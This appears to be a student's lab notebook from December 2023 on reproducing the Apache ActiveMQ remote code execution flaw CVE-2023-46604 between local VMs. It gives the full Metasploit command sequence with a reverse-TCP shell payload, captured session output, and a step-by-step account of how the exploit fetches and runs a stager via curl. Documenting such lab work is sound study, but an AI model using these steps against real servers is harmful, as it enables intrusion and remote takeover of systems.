# dec 1st, 2023

## Vulnerability selection
- https://www.cvedetails.com/cve/CVE-2023-46604/
- seems to be a good candidate, the exploit does not seem that hard to run
- How to know if it's a good candidate?
- making sure to have the subject locked in would be a good start
- suppose we have a budget of time/effort (which we have, its not measured). Let's say we start working and keep searching for something else to deliver instead. What would it be, should it be sexier? In which way? Something that I know of? Hmmm. Maybe that's fear about not being able to deliver on the project.
- For now I'll keep the current choice

## Install kali linux
- Live installation seems like the best option
- I'm proceeding with an USB live installation
- download with the torrent option (with Transmission) seemed like the best way to get there
- Aborted, too troublesome (supposed pendrive would not boot properly)

## Virtualbox image was the solution
- Vagrant created vm has a potentially diferent user and password
- Now the challenge is to make the exploit work
- Some steps I propose to attack the issue is to setup apache mq with some sort of demo application and then deploy the attack over the port and address in which the machine that is running the service is operating. There is a variable called RHOST and RPORT that probably should receive this information when it comes to metasploit-framework
- another important details is that the exploit I need is not available at the varsion of the metasploit-framework that ships with kali-linux, so installing from the github repository seems to be the quicker way to get the exploit. This can be done through some commands I could find reading the github page of the project.
- Possibly the final result would be:
	- VM running the apache ActiveMQ (victim machine)
	- machine running Kali or something lighter (attacker)
	- a demo program running inside the victim machine that allows for the exploit to have some traceable side effect of the hack
- For the start I'm considering doing everything inside the the kali machine.
	- setup apache with a really small application
	- run the exploit
	- break things down to some scripts
	- get the kali virtual box to work OR make everything over docker containers, but for now I don't think that it is productive to consider this, let's make things work at least once.

# dec 2nd, 2023

## Apache Active MQ setup
- Tried a first deploy, to find out that I selected the wrong version for the software
- now with the right version the challenge was to select a payload that could work
- managed to find this: payload/cmd/linux/http/x64/shell/reverse_tcp, which can be set with "set payload payload/cmd/linux/http/x64/shell/reverse_tcp"
- now the challenge seems to be around the ports used to listen to and to deliver the payload
- I managed to make the exploit work locally
- In order to do it, some steps are necessary:
	- launch activemq (run ./activemq console inside the bin folder (under the directory that contains the apache activemq installation))
	- launch metasploit
	- use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
	- show targets
	- set TARGET 1 // (1 should be Linux)
	- show options
	- set RHOSTS 127.0.0.1
	- set SRVPORT 8081
	- set payload payload/cmd/linux/http/x64/shell/reverse_tcp
	- exploit
	- This should output something like:
	```
	[*] Started reverse TCP handler on 10.0.2.15:4444 
	[*] 10.0.2.15:61616 - Running automatic check ("set AutoCheck false" to disable)
	[+] 10.0.2.15:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.17.5
	[*] 10.0.2.15:61616 - Using URL: http://10.0.2.15:8081/yj43yvtRDrzv
	[*] 10.0.2.15:61616 - Sent ClassPathXmlApplicationContext configuration file.
	[*] 10.0.2.15:61616 - Sent ClassPathXmlApplicationContext configuration file.
	[*] Sending stage (38 bytes) to 10.0.2.15
	[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.15:49942) at 2023-12-02 15:14:28 -0500
	[*] 10.0.2.15:61616 - Server stopped.
	```
	- And you should be able to get some output by running "ifconfig" for example, this shell is already working on the victim machine
- The challenge now seems to be around deploying the environment efficiently
- Maybe we could build two containers (using docker), one for the attacker and one for the victim
- we launch activemq in the victim and expose the ports
- I have some questions around the possibility of sending commands to the msf6 shell, maybe that is not possible the same way we send the comands to the default shell
- But first it seems more interesting just to try and make it work using a NAT between kali and a new vm that exposes the port (remember to create an exception to the ports (maybe more than one) used by activemq.)

# dec 3rd, 2023
- Tried to connect the vm managed with grant to the vm that runs kali
- tried the "internal network" mode first, found out that vagrant was having trouble setting the first nework adapter to this configuration (it seems like the first adapter [should be NAT no matter what](https://github.com/hashicorp/vagrant/issues/6268))
- Then I added some extra configuratin to the vagrant file
```
config.vm.network "private_network", ip: "192.168.56.4",
					virtualbox_intnet: "isolatednet1"
```
- In the vm that runs kali I added a new adapter of the type "Host-only Adapter" with the name "vboxnet0" from the dropdown
- this configuration happened to exist in the same way in the other vm (the victim)
- Then I tried to connect the two machines through this new network using netcat
- I could not reach the victim machine (the server in the occasion) using netcat
- I installed ufw and added a rule to allow connections aimed at port 4000:
	```sudo apt install ufw```
	```sudo systemctl start ufw```
	```sudo systemctl status ufw```
	```sudo ufw allow 4000```
- Now I was able to connect both machines using netcat
	nc -l -p 4000 // for the "server"
	nc 192.168.56.3 4000 // for the "client"
- And it works!
- Now I managed to make the exploit work from the attackers machine to the victim machine, it turns out that I was not setting the exploit correctly
- there is a command "info -d" that generates an html guide on the exploit
- this guid had some info around how to set the exploit to work properly
- now the steps should be:
    use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
    set TARGET 1
    show options
    set SRVHOST eth1
    set LHOST eth1
    show options
    set RHOSTS 192.168.56.4
    show options
    check
    set PAYLOAD payload/cmd/linux/http/x64/shell/reverse_tcp
    check
    exploit
- and they should work
- right now it seems a good moment to find out about what is actually happening here by analyzing the exchanges that happen between the two machines
- understanding a little bit off Ruby was crucial to get what was happening in order to craft the binary data intended to exploit the marshaller behavior
- now I think about replicating the attack over a more realistic target, like a container or a deployed broker instead of the debugging one we launch with "activemq console"
    - though this does not seem like something with more precedence than the report
    - consolidating the work so far would be a good approach
        - this could be achieve quite reliably by pushing the environment to the cloud
    - maybe setting up a kali vm with a graphic environment would be great, that way everything needed to run the experiments could be made available with a few text files in a Git repo
    - that would be useful
- I noticed that at first the broker sends some sort of 'announce' message with some info in WireFormat, we close the connection right after
- probably we should start working over the report, that could be written in LaTeX, though I don't quite have a good template for this kind of things YET
- user and password for Kali are 'vagrant' and 'vagrant' by the time of this writing (default at first startup)
- next tasks:
    - start report (preferably in latex)
    - push code to repo (OK)
    - learn how to instantiate vm with graphic environment and anchor it to the host display
    - instantiate attacker's vm through vagrant and include the file in the repository
    - reassess tasks

# dec 5th, 2023
- The understanding of the exploit is even better
- At this point I managed to find the source code for the stager (the piece of software that sets up the reverse tcp) and the code that sets up the shell
- the code for the stager (in the case of linux) can be found [here](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/x64/reverse_tcp_x64.rb#L12) and the code for the shell provisioning can be found [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stages/linux/x64/shell.rb)
- we can also intercept the files along the way by listening to the packets, dumping the text to hex + ascii and then [translating the hex into binary files](https://tomeko.net/online_tools/hex_to_file.php?lang=en), to only then try and dump the binaries as assembly code. The stager is an .elf file and can be disassembled through IDA Pro (the trial version), though the payload itself (the shell provisioner) can be disassembled through the use of objdump:
    - ```objdump -D -b binary -m i8086 <binary-file>```
- so from a high level, the steps are as follows:
    1. We send an exception response message to the broker using OpenWire
    2. This message allows us to instantiate an xml context by indicating an URI that points to the attacker machine at a specific port
    3. At construction time, the class is going to fetch from this URI in order to initialize its context
    4. We are going to provide an xml that instantiates a ProcessBuilder that launches a call to curl
    5. This curl call fetches a file from the attacker, set it as executable and runs it
    6. This file is the stager and is meant to setup an outbound TCP connection that reaches for the attacker host
    7. After connecting with the attacker the victim is going to receive the payload for the exploit, which is machine code to execute the shell and do the stdin and stdout setup in order to bridge the attacker into the shell under the victims system

